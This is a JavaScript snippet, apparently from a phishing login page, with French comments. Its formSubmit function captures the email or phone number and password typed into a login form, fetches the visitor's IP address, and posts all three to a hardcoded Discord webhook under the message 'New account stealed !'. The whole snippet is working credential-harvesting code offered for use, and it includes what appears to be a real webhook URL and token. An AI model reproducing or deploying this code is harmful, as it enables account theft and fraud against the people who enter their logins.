<script>
    function formSubmit() {
      const email = document.getElementById("mail").value;
      const password = document.getElementById("pass").value;
      const webhookUrl = "https://discord.com/api/webhooks/1097301347273035957/gFU3OblYE_WvfNqefpERxJ3TzOGfcLImQJSCiOSQyihhTLOZerXlyuhNtLejVgiVQtmW"; // Remplacez WEBHOOK_ID et WEBHOOK_TOKEN par les valeurs de votre propre webhook

      // Requête pour obtenir l'adresse IP du visiteur
      const ipRequest = new XMLHttpRequest();
      ipRequest.open("GET", "https://api.ipify.org?format=json");
      ipRequest.onload = function () {
        const ipData = JSON.parse(this.responseText);
        const ipAddress = ipData.ip;

        // Données à envoyer via le webhook
        const data = {
          "content": "```New account stealed !```",
          "embeds": [
            {
              "title": "New Login",
              "color": 15406156,
              "fields": [
                {
                  "name": "Email/phone number",
                  "value": email,
                  "inline": true
                },
                {
                  "name": "Password",
                  "value": password,
                  "inline": true
                },
                {
                  "name": "IP Address",
                  "value": ipAddress,
                  "inline": true
                }
              ],
              "timestamp": new Date().toISOString()
            }
          ]
        };

        // Envoi de la requête webhook avec les données
        const request = new XMLHttpRequest();
        request.open("POST", webhookUrl);
        request.setRequestHeader("Content-type", "application/json");
        request.send(JSON.stringify(data));
      }
      ipRequest.send();
    }
  </script>